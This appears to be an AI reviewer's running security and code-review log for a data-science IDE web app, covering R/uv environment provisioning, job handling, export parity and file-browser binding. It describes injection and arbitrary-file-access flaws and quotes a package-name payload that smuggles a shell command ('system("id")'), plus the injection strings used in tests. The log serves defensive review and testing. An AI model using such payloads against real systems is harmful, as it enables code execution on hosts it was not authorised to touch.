- **No new injection from env install-options** — `repos`/`indexUrl`/`trustedHost` flow ONLY into subprocess env vars (`RENV_CONFIG_REPOS_OVERRIDE`, `UV_INDEX_URL`, `UV_INSECURE_HOST`), never into `Rscript -e`/shell source; R `method` allowlisted twice (env_options + renv_provisioner). Package specs still allowlist-validated at schema + route + provisioner; `uv add/remove` keep the `--` argv boundary. **Subprocess timeouts** present on edit ops (120s) and builds (`build_timeout_seconds`).
- **SVG sanitize after the XML switch is safe** — empirically probed: `stripDangerous`'s `querySelectorAll('script')` matches svg-namespaced `<script>` (type selector = local name, namespace-agnostic) and the `on*` attribute loop strips `onload`/`onclick`/`onerror`; the `parsererror` path falls back to HTML parsing + `stripDangerous`. (`javascript:` in href is NOT stripped, but that's unchanged pre-existing behaviour and secondary to the iframe findings — a `<a xlink:href=javascript:>` needs a click, and the figure SVG path renders via `dangerouslySetInnerHTML` where inline handlers/scripts are already gone.) `namespaceSvgIds` regex handles `url(#id)` with spaces/quotes + `href`/`xlink:href`; only misses refs inside `<style>` CDATA (not present in svglite output — latent).
- **Export parity clean** — `_columns.json` removal safe (write-only, never read on import, both builders + create-project skill dropped it, goldens regenerated green on TS AND Python); parseOptions inline in `_tree.json` with matching omit-when-None on both sides (golden pins it); createdAt pointer omit (`aeb4e434`) is the prior review's fix, landed; `_json`/`export_json` whole-float→int + separators/indent/no-trailing-newline parity intact.
- **Ephemeral kernel lifecycle** — `run_ephemeral` always `shutdown()` in finally; `EphemeralConcurrency` semaphore released in `__aexit__`; `spawn_batch` kernels caller-owned + shut down. **WarmPool reservation counter** has no overshoot (need computed under lock incl. reserved; per-warm failure decrements + shuts down; acquire's wait loop sleeps, not busy-spins). **Cancellation** kills the subprocess (CancelledError propagates to run_jobs finally → shutdown; build provisioners `proc.kill()`). Blocking calls off the loop (`asyncio.to_thread` on package ops + `resolve_cache`).
- **_exec_capture_last / R withVisible** — last bare expression eval'd exactly once (no double-exec), `result` popped each run (no stale-table leak), `withVisible` auto-prints only visible values so the injected dataset preamble's intermediates don't leak. **Auth gates** present: `run_as_job`/ephemeral `execute_code` call `_require_execute` (purpose→permission); `render` refuses `purpose='render'` on /execute; `prewarm` gates app-env pool at read, code-widget pool at `dashboards:execute`.
- **Widget-editor draft** — Cancel discards (draft is local state, whole editor remounts per widget via `key={current.id}`); ⌘S saves draft-derived `nextSource` (not stale store), guarded by `dirty` JSON-compare, listener uses a ref (no stale closure). **ANSI → no XSS** (React children, auto-escaped, no dangerouslySetInnerHTML). **SQL safety** in dataset_rows/dataset_fs intact (`_quote_ident`, int-constant LIMIT, no raw column-name/value interpolation); sidecar filename is `sha1(rel)` + `_safe_join` traversal guard. **Column-id parity** (twin `column-id.ts`/`column_id.py`) so pushed Goupile meta matches server ids. **FilesPage run-guard** reads the live store (`useRuntimeStore.getState().isExecuting`), not the stale closure. No new `any`, no `console.log`, no direct state mutation, list keys stable/unique.

Carried follow-ups (non-blocking): entity-io.ts (~2.5k)/seed-loader.ts/WorkspacesPage.tsx split; box-plot/histogram helper extraction+tests; git-content-retry token hint; PTY idle sweep (now joined by the new WarmPool idle-sweep gap). Pre-existing/systemic (out of scope): `workspace_id is None → no access check` (planned access-group rework); `update_project` destination-workspace authz on move; ~152 React-Compiler set-state-in-effect warnings.

### Fixes applied this review (uncommitted, awaiting user test) — 2026-08-02

The user approved fixing **all** findings. Applied (verified in source; tests added/updated; golden regenerated + re-verified byte-parity both sides):

**🟠 (all fixed):**
- **Widget iframe sandbox escape** — dropped `allow-same-origin` from BOTH widget iframes (`JobsIndicator.tsx:172`, `OutputPanel.tsx:320`) → now `sandbox="allow-scripts"` only, matching `CatalogExportTab`. A srcDoc iframe inherits our origin, so `allow-scripts`+`allow-same-origin` let untrusted widget JS reach the parent origin (cookies/session/DOM); plotly/leaflet/DT run fine on `allow-scripts` alone. (A `sanitize.test.ts` was drafted for the SVG-script/handler/js-href cases but REMOVED: `sanitizeHtml` depends on `DOMParser`/`XMLSerializer`, browser APIs unavailable in the deliberately node-only pure-logic harness — jsdom is not a project dep; adding it would break the convention. The SVG-strip behaviour was verified empirically during the review instead.)
- **run-as-job wall-clock timeout** — new `settings.job_timeout_seconds` (1800s); `run_jobs.body` wraps `k.execute_stream` in `asyncio.wait_for` → a chatty loop can no longer reset the per-readline deadline forever and pin the shared `max_build_concurrency` slot. On timeout it flushes buffered output, raises (job → `error`), and the `finally` shuts the batch kernel down (kills the subprocess).
- **WarmPool idle sweep** — new `WarmPool._sweep_idle_locked` (mirrors `KernelManager._sweep_idle_locked`): evicts warm processes idle past `session_timeout_minutes` (and dead ones), run opportunistically under lock at the start of `acquire`/`refill`, shutting evicted kernels down outside the lock. A prewarm burst that widgets never consume no longer pins interpreters until app shutdown. (Test mock `_RunKernel` gained `idle_seconds`/`last_activity` to match the real Kernel contract.)
- **Fire-and-forget refill/prewarm GC** — new module-level `_bg_tasks` set + `_spawn_bg` helper (retain + `add_done_callback(discard)`); both `run_ephemeral` refill and `prewarm` now go through it, so the event loop can't GC the refill mid-flight.

**🟡 batch (all fixed except the pre-existing broken assemble test, see below):**
- **`enable_code_execution` gate** — added to `_require_execute` (covers `/execute` incl. ephemeral + the new `/execute/run-as-job`) AND to `render_component`, matching the terminal-WS / env-route / fs_browser kill switch.
- **R `saveWidget(selfcontained=FALSE)` fallback removed** — only `selfcontained=TRUE` now (a non-self-contained widget renders blank in the network-less sandboxed iframe); the save error is surfaced instead of a broken widget.
- **parseOptions canonical key order** — new twin `_canonical_parse_options` (Python: `dataset_fs` for the sidecar + `project_export` for the golden-path map) and `canonicalParseOptions`/`datasetExportMeta` (TS `entity-io.ts`), so the exported `datasets/_tree.json` order is independent of option write-history → no spurious churn, front/back byte-identical. Golden regenerated (TS writes `columnFilterMode` before `columnTypes`); Python `test_project_export.py` re-passes byte-for-byte (14). New tests: `test_canonical_parse_options_sorts_keys_and_nested_maps`, `test_dataset_tree_parse_options_order_independent`.
- **Goupile repeatable-form data loss** — `parseGoupileWorkbook` now returns `duplicateForms` (a form with >1 row per `__tid`) AND unions ragged-sheet headers (a column absent from row 0 is no longer dropped); `UploadDatasetDialog` shows a non-blocking amber warning (`datasets.goupile_duplicate_rows`, both locales). New tests: no-duplicate/duplicate-form/ragged-headers.

**NOT changed (out of scope, flagged for the user):**
- `test_project_export_assemble.py::test_assembler_reproduces_golden_tree` is **broken on pristine HEAD** (verified: fails on a clean working tree at commit 439ef75b, before ANY of my changes). Its `_seed` doesn't write the parseOptions sidecar that commit `1a7ae65b` introduced, so the DB-round-trip assemble path can't reproduce the golden's inline parseOptions. This is the author's to fix (make `_seed` write the sidecar via `dataset_fs.write_parse_options`); I left it untouched rather than mask a legitimately-failing test.

Verification: frontend **489 tests** pass (46 files, +3 vs review baseline of 486) · **0 lint errors** (148 pre-existing React-Compiler warnings) · typecheck **0 errors** · i18n parity clean (4038/4038). Backend my-touched-area **145 pass** (+ new package_spec/env_options/kernel/export cases) · ruff clean on all touched files · project-export golden byte-parity re-verified on TS AND Python. The one red backend test (`test_assembler_reproduces_golden_tree`) is pre-existing/broken-on-HEAD, not from this work. All uncommitted, awaiting the user's app test.
NOTE: the working tree is shared with parallel sessions — a transient `workspace-export-golden` failure seen mid-review came from another session's in-flight `workspace_export.py` change and resolved on its own.

---

## 2026-08-01 — IDE Environments (managed uv/renv envs, steps 1–7) + DB-backed jobs + streaming Run over WebSocket (Python+R) + R kernel per-expression flush & whole-run interrupt + versioning (prune deleted marks / preserve createdAt / sync-all-managed / omit empty _tree.json) + xlsx→official SheetJS 0.20.3 + npm audit fix + summary/footer UI polish

- Reviewed by: Claude Opus 4.8 — 4 parallel adversarial Explore sub-agents by feature group (1: env backend provisioners/routes/jobs [highest injection risk]; 2: streaming Run + R/Python kernel; 3: versioning/export byte-parity; 4: deps supply-chain + UI + i18n). **Reviewer independently re-verified EVERY 🔴 and 🟠 in source:** the R injection (renv_provisioner.py `_to_renv_ref` does zero escaping; package strings interpolate raw into `renv::record(c("…"))` :119, `lf$Packages[['…']]` :133, `renv::record('…')` :143; `AddPackagesRequest.packages` has no validator; remove uses raw `{package}` path param, upgrade raw `?package=` query), the missing `enable_code_execution` gate (execute.py:469 checks it, environments.py router does NOT → add/build shell out with exec disabled), the sync-provisioner-on-event-loop block (environments.py:115/123/128/137 call blocking `subprocess.run` fns directly in `async def`, no `asyncio.to_thread`, no timeout), the two streaming-run gaps (FilesPage.tsx:668 `if (isExecuting) return` reads a stale closure not the live store; :589-607 server-mode branch never passes `controller.signal` to `streamOnServer`, which has no abort param — execution.ts:61), and the createdAt pointer parity asymmetry (entity-io.ts:2012 drops `undefined` createdAt via JSON.stringify vs workspace_export.py:213 emits `"createdAt": null` — export_json/json.dumps has no None-drop).
- Range: d94375f6..0a3a9a39 (**36 commits, 102 files, ~4,547 insertions / ~1,233 deletions**). First commit `c5cb9e04` = the 2026-07-30 review's own fixes landing (spot-checked intact). Highlights: **IDE Environments** (steps 1–7 on feature/fastapi-backend): per-project env table + lazy resolution (`6dfd29df`), `max_kernels_per_user` rename (`c233842a`), **Python managed envs via uv** (`uv_provisioner.py`, `076a4a65`), **DB-backed jobs + bounded executor + footer panel** (`jobs.py`/`JobsIndicator.tsx`, `950f7f99`), **R managed envs via renv** (`renv_provisioner.py`, `b5b2977a`), export/import env specs (`51ec5b23`), auto-build on first run + preset + workspace defaults (`DefaultEnvironmentsTab.tsx`), **streaming Run over the kernel WebSocket** Python+R (`7479ad7e`, `streamOnServer`), **R kernel per-expression live flush** (`0177a726`) + **whole-run interrupt** (`b81725bf` — no test2 after interrupted Sys.sleep), footer session-wording + Stop (SIGINT) + full-log job modal + CRAN mirror (p3m); **read-only syntax-highlighted view-source** (`CodeViewer.tsx`, `f638fff6`) + animated activity dots; **versioning**: prune deleted files from versionedDataFiles/excludedFiles at export (`1b9ede7c`, byte-parity twins), preserve createdAt across git round-trips (`c262f3d2`), sync all Linkr-managed files/foreign left aside (`6d43519a`), omit `scripts/_tree.json` when all code excluded (`03f4770a`); **security deps**: xlsx@0.18.5 → official SheetJS 0.20.3 CDN tarball (`0a3a9a39`), npm audit fix (`b1a2599b`); summary pluralization + footer scoping polish.
- Last reviewed commit: 0a3a9a39eedf1d856f4a4845a3365a7ce8392f0f
- Verdict: **Fix-then-ship** — 2 🔴 (R package-name injection RCE; missing `enable_code_execution` gate on env routes — **they compound into RCE on a code-execution-disabled instance**) + 5 🟠 (sync-on-event-loop block; no subprocess timeout; stale-closure run guard; Stop doesn't cancel the stream; createdAt pointer parity asymmetry) + a 🟡 batch. **Nothing fixed yet — awaiting user direction.**
- Tests: frontend **435 passed** (40 files) · backend touched-area **108 passed** (environment_resolve/routes, jobs, uv_provisioner, project_export/assemble, projects, fs_browser, kernel_manager, execution — via `apps/api/.venv`) · Lint: **0 errors** (150 pre-existing React-Compiler warnings) · i18n parity: **clean** (3988/3988, 0 keys diverge en↔fr) · dependency swap verified legit (official cdn.sheetjs.com tarball, hash-pinned, API-compatible, not a typosquat).
- Reminder: `apps/api` is **not in the shipping build** (prod = static WASM). **Both 🔴 and the injection/DoS/blocking 🟠 (#3, #4) are server-mode only** — they do NOT hit the shipping WASM build. BUT for any full-stack deployment the two 🔴 are the most serious defects in the range (RCE), weighted highest. The two streaming-run 🟠 (#5, #6) hit server-mode IDE only. The createdAt parity 🟠 (#7) affects BOTH modes on a shared remote (front-only user + server user versioning the same legacy project churn the diff).

Findings (all 🔴 and 🟠 re-verified in source):

**🔴 CRITICAL:**
- 🔴 renv_provisioner.py:119,133,143 (`_to_renv_ref`:151-156) + schemas/execution.py:86 (`AddPackagesRequest`, no validator) + routes/environments.py:105-122,150-169 — **R code injection → RCE via package names (server mode).** Package strings interpolate raw into `Rscript -e` source. `["x\"); system(\"id\"); (\""]` → arbitrary shell. `remove` uses raw `{package}` path param, `upgrade` raw `?package=` query. Python/uv side is argv-safe — R-specific. Fix: allowlist-validate refs (`^[A-Za-z0-9._-]+(@[A-Za-z0-9._-]+)?$`) in a field_validator + the route path/query params, before the provisioner; never interpolate into R source.
- 🔴 routes/environments.py (whole router) — **`enable_code_execution` never enforced on env/build routes (server mode).** `/execute`:469 gates on it; env router gates only `ide:<action>`. With `ENABLE_CODE_EXECUTION=false` an editor can still add packages (→ RCE via #1) and POST `…/build` (runs `uv sync`/`renv::restore` → installs+executes arbitrary package setup on the host). Fix: `if not settings.enable_code_execution: raise HTTPException(403)` in `_require_ide`. **#1+#2 together = RCE on an exec-disabled instance.**

**🟠 IMPORTANT:**
- 🟠 services/execution/environments.py:115,123,128,137 — **sync provisioner (blocking `subprocess.run`) called directly in `async def`, no `asyncio.to_thread` → blocks the single uvicorn worker.** uv/renv module docstring says these must run in a thread executor. A slow index resolve freezes the whole API. Fix: `await asyncio.to_thread(...)`.
- 🟠 uv_provisioner.py:107 + renv_provisioner.py:72 + both async builds — **no subprocess timeout.** A hung `uv add`/`renv::restore` runs forever; async builds hold a `max_build_concurrency` slot permanently → all builds wedge. Fix: `timeout=` on sync calls; `asyncio.wait_for` around the build read-loop.
- 🟠 FilesPage.tsx:668 — **run guard reads a stale closure, not the live store.** `if (isExecuting) return` uses the render-time value; two rapid Cmd+Enter before React commits → two output cards + two kernel WebSockets. Fix: `if (useRuntimeStore.getState().isExecuting) return`. Bounded (kernel serializes runs).
- 🟠 FilesPage.tsx:589-607 + execution.ts:61-105 — **Stop doesn't cancel the client stream.** Server-mode branch never passes `controller.signal`; `streamOnServer` has no abort param / no external socket-close. Stop fires HTTP SIGINT (usually works) but the WS stays open to server `done`/timeout; `isExecuting` flips false while a socket is live (compounds the stale-guard). Fix: add an `AbortSignal` to `streamOnServer`, close the socket on abort.
- 🟠 entity-io.ts:2012 vs workspace_export.py:213 — **git-link pointer createdAt parity asymmetry → spurious diff on a mixed-mode remote.** Absent createdAt: TS drops the key (JSON.stringify omits `undefined`), Python emits `"createdAt": null` (export_json/json.dumps has no None-drop). Narrow (server `created_at` always stamped; only front-only legacy projects are `undefined`) but a front↔server round-trip on a legacy project diverges — the exact class the last 2 reviews hunted. Fix: both builders omit the key when empty, preserving key order.

**🟡 MINOR (batch):**
- 🟡 jobs.py:70 + environments.py:197 — **build job marked "done" even when the build failed.** `environments.build` sets `env.status="error"` but returns normally → job shows green "done" while the env is broken. Arguably 🟠 UX. Fix: raise on `not result.ok`.
- 🟡 uv_provisioner.py:132,138 — **uv add/remove has no `--` argv separator** → leading-dash package parsed as a uv flag (argv-safe, not RCE). Fix: `["add","--no-sync","--",*packages]` + share the #1 allowlist.
- 🟡 ServerEnvironmentsPanel.tsx:101-110 — **unbounded build poll** (1.5s loop, no cap) pins the UI "building" forever on a hung server build (no leak — busy-guarded, unmount drops it). Add a max-attempt/wall-clock cap.
- 🟡 git-file-meta.ts:42-43 — **`databases` and `mappings` both `= 8`** after `environments: 7` inserted → Details grouping ties in shared scopes. Cosmetic. Fix: renumber the tail.
- 🟡 kernel.py — **SIGINT between R/Python expressions is uncaught → kills the interpreter** (new per-expression loop widens the window). Fix: wrap the whole per-request body. (The whole-run interrupt fix itself is correct.)
- 🟡 OutputPanel.tsx:472 `aria-label="running"` hardcoded (assistive-tech only); `jobs.title` uses bare-key + `_other` instead of `_one`/`_other` (functionally correct in i18next v25, just inconsistent).

Verified sound ✅ (actively probed, no finding):
- **No `shell=True` anywhere;** Python/uv package specs argv-separated (R is the sole injection point). Path confinement holds (uid must match a real DB row; env dirs from `project_fs`). `r_repos`/index URLs are static server config, not user-controlled.
- **No auth downgrade on the streaming path** — `streamOnServer` used only by the IDE FilesPage (widgets/analyses still use `executeOnServer` with their `purpose`); both IDE gates are `ide:execute`; the WS enforces `_require_code_execution` incl. `enable_code_execution`. **No XSS** — streamed output in an auto-escaped `<pre>`; only the figure-SVG `dangerouslySetInnerHTML` goes through `sanitizeHtml`. **CodeViewer genuinely read-only** (`readOnly`+`domReadOnly`, no run commands registered). **R whole-run interrupt correct** (`.interrupted` flag + `break`; test2 after interrupted Sys.sleep no longer runs); per-expression flush ordering sound.
- **Versioning parity clean** for the two parity-sensitive commits — prune-deleted (`1b9ede7c`) and omit-empty-`_tree.json` (`03f4770a`) have byte-identical twins in both builders; `.gitignore` metachar escaping intact; the last review's `scripts/scripts/` double-prefix mark-key trap is NOT reintroduced (prune uses the correct logical key space). `env_specs` server-only insertion is legitimately absent front-only (parity holds). **`6d43519a` foreign-files-aside** is the safe direction (foreign files excluded from Sync-all + never proposed for deletion).
- **Dependency swap legitimate** — xlsx → official `cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz`, hash-pinned in the lockfile, `import * as XLSX from 'xlsx'` API-compatible (only `read`/`sheet_to_json` used), not a typosquat. npm audit fix adds no non-npm resolves, no suspicious deps. **i18n parity perfect** (3988/3988). No new `any`, no `console.log`, no oversized files (largest changed TerminalPanel.tsx 504), list keys stable/unique.
- Concurrency cap exists (`max_build_concurrency` semaphore); job ownership enforced on cancel; env resolve race handled (unique constraint + IntegrityError rollback). Restart reconciliation marks orphaned jobs `error`.

Carried follow-ups (non-blocking): entity-io.ts (~2.5k) split; box-plot/histogram helper extraction+tests; client-side prune unit test (Python has one). Pre-existing/systemic (out of scope): `workspace_id is None → no access check` pattern (planned access-group rework); `update_project` destination-workspace authz on move; 150 React-Compiler set-state-in-effect warnings.

### Fixes applied this review (uncommitted, awaiting user test) — 2026-08-01

The user approved fixing **all** findings. Applied (verified in source; injection payloads exercised in a new test; both parity sides re-run). The createdAt-pointer fix only changes export bytes for the *absent*-createdAt case, which the golden fixtures don't exercise (their project has a real createdAt), so the goldens are unchanged and the new dedicated pointer unit tests (TS + Python) cover the omit case.

**🔴 (both fixed):**
- **R injection RCE** — new `app/services/execution/package_spec.py` `validate_package_spec` (allowlist `^[A-Za-z0-9][A-Za-z0-9._-]*$` for name + version, rejects a leading dash so a `-flag` can't slip through uv either). Enforced at THREE layers: schema `AddPackagesRequest` field_validator, route path/query params (`_valid_package` in environments.py for remove `{package}` + upgrade `?package=`), and inside both provisioners (`renv_provisioner` add/remove/upgrade, `uv_provisioner` add/remove/upgrade) as defence-in-depth right before the R-string/argv. New `tests/test_package_spec.py` exercises the R/shell injection payloads (`x"); system("id"); ("`, backticks, `;`, newline, `)`, `#`, `-rf`, empties) + route tests (`test_injection_package_name_rejected`, `test_remove_package_injection_rejected`).
- **`enable_code_execution` gate** — `_require_ide` now refuses any non-read env op with 403 when `settings.enable_code_execution` is false (matches /execute). Test `test_code_execution_disabled_blocks_writes` (add→403, list→200).

**🟠 (all fixed):**
- **sync-on-event-loop** — `environments.add_packages`/`remove_package`/`upgrade` now `await asyncio.to_thread(...)` the blocking provisioner calls (list_packages is a fast lockfile read, left sync).
- **no subprocess timeout** — `_UV_EDIT_TIMEOUT`/`_R_EDIT_TIMEOUT` (120s) on the sync `subprocess.run`; new `build_timeout_seconds` config (1800s) wraps both async build read-loops in `asyncio.wait_for` (kills the process + returns `ok=False` on timeout).
- **stale-closure run guard** — FilesPage `runCode` now guards on `useRuntimeStore.getState().isExecuting` (live store), not the render-time closure; `isExecuting` dropped from the (now-unused) deps.
- **Stop doesn't cancel the stream** — `streamOnServer` gained a `signal?: AbortSignal`; FilesPage threads `controller.signal`; on abort the socket closes + the promise rejects `AbortError`, which the catch treats as a clean Stop (keeps partial output, no error card).
- **createdAt pointer parity** — both builders (entity-io.ts:2015 + workspace_export.py:210) now OMIT createdAt when absent (`...(createdAt ? {createdAt} : {})` / conditional dict insert, key order preserved). New twin tests: TS `buildWorkspaceZip — git-link pointer createdAt` (omit + keep, key-order) + Python `test_workspace_export_pointer.py`.

**🟡 batch (all fixed):**
- **build job "done" on failure** — `environments.build` now raises `ProvisionError` after persisting `env.status='error'`, so the job runner marks it `error`; both job bodies flush the log in a `finally`. Test `test_build_failure_marks_env_error_and_raises`.
- **uv `--` separator** — `add`/`remove` argv now `["add","--no-sync","--",*safe]`.
- **unbounded build poll** — ServerEnvironmentsPanel caps at `MAX_POLLS` (~just past the server build timeout) then shows `environments.build_taking_too_long` (new i18n key, both locales).
- **CAT order collision** — git-file-meta renumbered `databases:8, mappings:9, concepts:10, scores:11, checks:12, config:13` (no more 8/8 tie; `attrs:90`/workspace-groups@20 clear).
- **SIGINT between expressions** — R kernel wraps the whole eval-loop body in an outer `tryCatch(interrupt=…)`; Python outer loop catches `KeyboardInterrupt` on idle readline (continue) + widens the per-run catch to `BaseException` so a stray SIGINT ends the run instead of killing the interpreter.
- **aria-label i18n** — `RunningDots` takes a `label` prop = `t('files.running')` (new key, both locales); `jobs.title` → `jobs.title_one` (convention consistency).
- Pre-existing `E741` (`lambda l:` in workspace_export git-links sort, from the review baseline `d94375f6`) cleaned to `link` while nearby.

Verification: frontend **437 tests** pass (+2 vs review baseline of 435) · **0 lint errors** (150 pre-existing React-Compiler warnings, same baseline) · typecheck clean on touched files · i18n parity clean (3989/3989, 0 divergent). Backend touched-area **141 pass** (+ new package_spec/env-route/env-resolve/pointer cases) · ruff clean on all touched files · export goldens unchanged + re-pass on TS AND Python (front/back byte-parity intact; the createdAt fix only affects the absent-createdAt path, covered by the new pointer tests). All uncommitted, awaiting the user's app test.

---

## 2026-07-30 — Server FS browser + 3 folder bindings (ide/scripts/datasets) + per-file versioning marking (badge/toggle on IDE files too) + git-links.json deterministic order + concept-mapping multi-select copy-list + datasets lazy-meta/fast-parquet/column-stats + sub-path deploy (BASE_PATH) + import-match by lineageId/projectId + large dead-code purge

- Reviewed by: Claude Opus 4.8 — 4 parallel adversarial Explore sub-agents by feature group (1: server FS browser + bindings [highest path-traversal risk]; 2: versioning per-file marking + git-links order; 3: concept-mapping copy-list + datasets/column-stats; 4: deploy/BASE_PATH + import-match + dead-code removal + permissions/runtime). **Reviewer independently re-verified EVERY 🔴 in source:** the FS-bind bypass (`project_service.update` lines 75-76 loop-`setattr` the three paths with NO `_within_roots` validator; browse routes guard roots but the bind is a plain `PATCH`; `project-settings` not in `_MEMBER_RESOURCES` → default **editor** gets `project-settings:write`; `fs_browse_roots` defaults to `""` = whole FS), the `excludedFiles` no-op (grep across whole repo → only writer app-store + badge reader FileTreeItem; no export builder consumes it, client or server), the front-only mark-key double-prefix (`FileTree` renders re-rooted `useProjectTree.nodes` which drops the synthetic `scripts` container, but `FileTreeItem` computes `markKey = "scripts/" + getNodePath(rawFiles, id)` over the raw `useFileStore().files` still carrying that container → `scripts/scripts/foo.csv` ≠ export `scripts/foo.csv`), and the Docker version drift (`Dockerfile.web` copies package.json/apps/web/packages but never `COPY VERSION` → vite `readFileSync('../../VERSION')` throws → falls back to `'0.0.0'`, while `c57ba14a` correctly fixed the API to read `2.2.1`).
- Range: 56aafc7c..d94375f6 (**37 commits, 212 files, ~5,045 insertions / ~6,630 deletions** — net negative; large dead-code purge). First commit `7b7d0976` = the 2026-07-22 review's own fixes landing (spot-checked intact). Highlights: **server FS browser + folder bindings** (`fs_browser.py` service+route, `fs-browser.ts`, `ServerFolderPickerDialog`/`FoldersTab`/`FolderPathBar`, `project_fs.py` +164, 3 independent server-folder bindings ide/scripts/datasets, `use-resolved-dirs`); **per-file versioning marking** replacing the include-data toggle (`versionedDataFiles` re-included via `!path`, data gitignored everywhere; badge+toggle on every IDE file — but `excludedFiles` half-wired, see 🔴); **git-links.json deterministic order** (sort type+id); **concept-mapping multi-select + copy-list modal** (`clipboard-list-format.ts`/`ClipboardListModal`, SQL/R/Python IN-lists); **datasets lazy-meta + fast parquet listing + column-stats extraction** (`column-stats.ts`/`.test.ts`, no event-loop freeze via `asyncio.to_thread`); **sub-path deploy** (BASE_PATH in vite.config + nginx WS-upgrade on /api/); **import-match by lineageId/projectId** (b4dc2bd6); **`npm run dev:client`**; **Docker VERSION-file resolution fix** (API side); **502/503/504→server-unreachable**; **dead-code purge** (−2.4k: datasets.py route, CohortCard, 5 criteria forms, SchemaERD, parse-sql-deps, cors-proxy, TerminalPane, RenameDialog, plugins/index, dead permissions.py role-rank code, legacy project-ZIP layouts).
- Last reviewed commit: d94375f6a5ed4f370947ccba0aa58ce74da94fd2
- Verdict: **Fix-then-ship** — 4 🔴 (FS-bind = arbitrary server file read/write for any editor; `excludedFiles` no-op badge; front-only IDE mark-key double-prefix; Docker front/back version drift) + 3 🟠 + a 🟡 batch. **Nothing fixed yet — awaiting user direction.**
- Tests: frontend **418 passed** (40 files) · backend touched-area **81 passed** (fs_browser, project_fs_bindings, datetime_format, git_content_status_service, dataset_parser, dataset_rows, project_export, dataset_files — via `apps/api/.venv`) · Lint: **0 errors** (150 pre-existing React-Compiler warnings) · i18n parity: **clean** (0 keys diverge en↔fr) · Ruff: clean on all touched backend files.
- Reminder: `apps/api` is **not in the shipping build** (prod = static WASM). **🔴#2 (excludedFiles) and 🔴#3 (front-only mark-key) hit the shipping WASM build** → weighted highest. 🔴#1 (FS-bind) and 🔴#4 (Docker drift) are server-mode/Docker only — but 🔴#1 is arbitrary server file read/write, the most serious defect in the range.

Findings (all 🔴 re-verified in source):

**🔴 CRITICAL:**
- 🔴 project_service.py:70-83 + api/v1/routes/fs_browser.py:54 + core/permissions.py:111-124 + schemas/project.py:88-90 — **FS-browser + folder-bind = arbitrary server file read/write for any project EDITOR (server mode).** `project-settings` is not a `_MEMBER_RESOURCE` → `_catalogue_perms("write")` grants the default editor `project-settings:write`, which gates the browse/validate/copy routes AND the bind. The browse routes enforce `_within_roots`/`enable_code_execution`, but the actual persistence is a plain `PATCH /projects/{uid}` whose `project_service.update` (lines 75-76) loop-`setattr`s `ide_path/scripts_path/datasets_path` with **no validator** (`ProjectUpdate` has none) → browse-root confinement is bypassed by `PATCH {"ide_path":"/root"}`; then `GET /ide/files` reads every file's content there. `fs_browse_roots` defaults `""` = whole FS. Fix: validate the three paths against `_within_roots` (+ dir-exists) in `project_service.update`/a Pydantic validator (400 on out-of-roots); apply `enable_code_execution` at bind time; consider raising the gate above editor-level `project-settings:write`.
- 🔴 FileTreeItem.tsx:143-191 + app-store.ts:519-540 — **`excludedFiles` (code-file "unmark from versioning") is a complete no-op; the badge lies (shipping build).** grep across the whole repo → only the writer (app-store `toggleExcludedFile`) and the badge reader (FileTreeItem `willBeVersioned`). No export builder reads it (neither `entity-io.ts buildProjectZip` nor server `project_export.py`; `grep excluded_files` in apps/api → nothing). Unmarking a script hides the badge but the file is still written, default-checked, committed, pushed. Fix: wire `excludedFiles` into both client+server builders (skip write + omit from `_tree.json`) and `defaultSelectedPaths`, or pull the code-file toggle until honored.
- 🔴 FileTreeItem.tsx:179 — **front-only IDE mark-key double-prefixed (`scripts/scripts/…`) → marked data file never re-included (shipping build, front-only).** `FileTree` renders re-rooted `useProjectTree.nodes` (drops the synthetic `scripts` container, reparents children to null), but `FileTreeItem` computes `markKey = "scripts/" + getNodePath(useFileStore().files, node.id)` over the RAW store (still has the container) → top-level IDE data file keys `scripts/scripts/foo.csv`, while export `buildIdePath` on the re-rooted tree yields `scripts/foo.csv` → mismatch, stays gitignored. Server mode fine (rootless disk tree); Datasets sidebar fine (separate getNodePath). Same latent double-prefix at :422/:484/:493 (copy-path, cosmetic). Fix: compute markKey from `useProjectTree(...).nodes`, not raw `useFileStore().files`.
- 🔴 docker/Dockerfile.web:12-16 — **Docker export-version drift: web bundle stamps `0.0.0`, API stamps `2.2.1`.** `vite.config.ts` reads `../../VERSION` → `/app/VERSION`, but the build stage copies package.json/apps/web/packages and NEVER `COPY VERSION` → `readFileSync` throws → vite falls back `'0.0.0'`; meanwhile `c57ba14a` fixed the API to read `2.2.1`. Front & back stamp different `appVersion` in Docker → false git diffs between a front-only and a server export of the same project (the exact drift CLAUDE.md warns about). Golden tests don't catch it (they run vite from the real repo). Fix: `COPY VERSION ./VERSION` in the Dockerfile.web build stage before `npm run build`.

**🟠 IMPORTANT:**
- 🟠 clipboard-list-format.ts:64-67 (+ :52-53 python) — **copy-list emits concept codes VERBATIM (unquoted) → malformed SQL/R/Python for non-numeric codes.** Medical codes are often non-numeric (`E11.9`, `LA6576-8`); `IN (E11.9)` is a syntax error, `IN (718-7)` silently subtracts. It's clipboard text (not a live sink) so impact = wrong generated queries, not RCE. Fix: quote string codes per-format (SQL `''`-doubling; R/Python `"…"` with escaping), or detect all-numeric and only then emit bare.
- 🟠 ColumnStatsPanel.tsx:239 → column-stats.ts:45-48 — **`buildHistogram` infinite-loops (browser freeze) on an `Infinity` column value.** Caller filters only `!isNaN(n)`; `Number("Infinity")` passes; `niceStep(Infinity)→1` → `for (lo=min; lo<Infinity; lo+=1)` never terminates. Low likelihood, real DoS. Fix: `Number.isFinite` filter and/or bail in buildHistogram on non-finite bounds.
- 🟠 entity-io.ts:684-685 + project_export.py:494 — **`.gitignore` `!path` exceptions not escaped for gitignore metacharacters.** A marked filename with `[ ] * ? #` or leading `!` is parsed as a pattern → silent non-versioning (the failure mode the feature prevents). Client+server emit identically (parity holds) but both need the same escape. Low likelihood. Fix: escape `# ! [ ] * ?` + trailing whitespace on both sides.

**🟡 MINOR (batch):**
- 🟡 column-stats.ts — `computeNumericStats([])` divides by zero → NaN; guarded by callers today but the exported pure fn is untested for empty. Add a guard + test.
- 🟡 No test covers the mark→`.gitignore`/`!path` round-trip or client↔server `.gitignore` byte-parity (entity-io.test.ts) — a golden would have caught 🔴#2, 🔴#3, and 🟠#3.
- 🟡 clipboard-list-format.ts:21-25 — a `concept_name` newline breaks the copy-list comment structure; strip `\r?\n`. Test coverage misses quote-in-code/newline-in-name/single-item/numeric-vs-string.
- 🟡 dataset-store.ts:526 — `ensureServerMeta` no in-flight dedup (rapid double-open → 2 fetches); harmless (idempotent merge).
- 🟡 auth-store.ts:95 — 502/503/504→serverUnreachable also swallows a genuine backend 503 (no security impact; 401/403/500 still fall through); semantic-only.
